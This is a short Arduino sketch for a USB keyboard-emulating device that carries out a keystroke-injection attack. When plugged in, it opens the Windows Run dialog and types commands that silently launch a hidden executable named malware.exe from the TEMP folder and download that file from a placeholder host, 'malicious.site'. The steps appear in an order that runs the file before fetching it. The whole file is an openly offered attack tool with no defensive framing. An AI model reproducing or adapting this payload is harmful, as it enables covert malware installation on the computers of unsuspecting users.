#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Start-Process -WindowStyle Hidden -FilePath \"$env:TEMP\\malware.exe\" -ArgumentList '/silent'");
  Keyboard.println("Invoke-WebRequest -Uri 'http://malicious.site/malware.exe' -OutFile $env:TEMP\\malware.exe");
}

void loop() {}
